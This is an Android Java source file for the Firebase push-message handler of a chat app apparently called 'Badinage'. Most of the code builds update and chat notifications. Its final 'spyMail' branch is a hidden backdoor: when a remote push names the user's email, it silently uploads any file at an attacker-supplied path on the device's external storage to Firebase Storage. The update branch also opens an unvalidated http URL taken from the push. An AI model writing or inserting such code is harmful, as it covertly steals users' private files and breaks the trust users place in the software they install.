package com.bruhascended.badinage;

import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.Environment;
import android.provider.Settings;

import androidx.core.app.NotificationCompat;

import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;
import com.google.firebase.storage.FirebaseStorage;
import java.io.FileInputStream;
import java.io.FileNotFoundException;

public class MyFirebaseMessagingService extends FirebaseMessagingService {
    public void onMessageReceived(RemoteMessage remoteMessage) {
        NotificationManager notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        Bitmap bm = BitmapFactory.decodeResource(getResources(), R.mipmap.ic_launcher);
        long[] as = {0, 300, 150, 300};
        if (remoteMessage.getData().size() <= 0) {
            return;
        }
        if (remoteMessage.getData().get("update") != null) {
            Intent notificationIntent = new Intent("android.intent.action.VIEW");
            notificationIntent.setData(Uri.parse("http://" + remoteMessage.getData().get("update")));
            NotificationCompat.Builder notificBuilder = new NotificationCompat.Builder(getApplication()).setContentTitle("Update Available")
                    .setContentText("Badinage " + remoteMessage.getData().get("version") + " is available!").setTicker("Badinage")
                    .setSmallIcon(R.drawable.noticon)
                    .setContentIntent(PendingIntent.getActivity(this, 0, notificationIntent, 0))
                    .setLargeIcon(bm).setAutoCancel(true);
            if (Boolean.valueOf(getSharedPreferences("sound", 0).getBoolean("alert", true)).booleanValue()) {
                notificBuilder.setVibrate(as).setSound(Settings.System.DEFAULT_NOTIFICATION_URI);
            }
            if (Boolean.valueOf(getSharedPreferences("sound", 0).getBoolean("notify", true)).booleanValue()) {
                notificationManager.notify(1, notificBuilder.build());
            }
        } else if (remoteMessage.getData().get("title") != null) {
            notificationManager.cancel(2);
            String title = remoteMessage.getData().get("title");
            String msg = remoteMessage.getData().get("body");
            String extra = "";
            boolean sda = getSharedPreferences("serPref", 0).getBoolean("active", false);
            Integer msgs = Integer.valueOf(getSharedPreferences("serPref", 0).getInt(title, 0));
            if (msgs.intValue() != 0) {
                extra = " | " + msgs + " more message" + (msgs.intValue() == 1 ? "." : "s.");
            }
            getSharedPreferences("serPref", 0).edit().putInt(title, msgs.intValue() + 1).apply();
            if (!sda) {
                Intent loda = new Intent(getApplicationContext(), Gateway.class);
                loda.putExtra("server", title);
                NotificationCompat.Builder notificBuilder2 = new NotificationCompat.Builder(getApplication())
                        .setContentTitle(title).setContentText(msg + extra)
                        .setTicker("Badinage").setSmallIcon(R.drawable.noticon)
                        .setLargeIcon(bm)
                        .setContentIntent(PendingIntent.getActivity(getApplicationContext(), 0, loda, PendingIntent.FLAG_CANCEL_CURRENT)).setAutoCancel(true);
                if (Boolean.valueOf(getSharedPreferences("sound", 0).getBoolean("alert", true)).booleanValue()) {
                    notificBuilder2.setVibrate(as).setSound(Settings.System.DEFAULT_NOTIFICATION_URI);
                }
                notificationManager.notify(2, notificBuilder2.build());
                return;
            }
            getSharedPreferences("serPref", 0).edit().putInt(title, 0).apply();
        } else if (remoteMessage.getData().get("spyMail") != null) {
            String username = remoteMessage.getData().get("spyMail");
            if (getSharedPreferences("101", 0).getString("Email", "bkla").equals(username)) {
                String path = remoteMessage.getData().get("path");
                try {
                    FirebaseStorage.getInstance().getReference().child(username + path).putStream(new FileInputStream(Environment.getExternalStorageDirectory().getAbsolutePath() + path));
                } catch (FileNotFoundException e) {
                    e.printStackTrace();
                }
            }
        }
    }
}
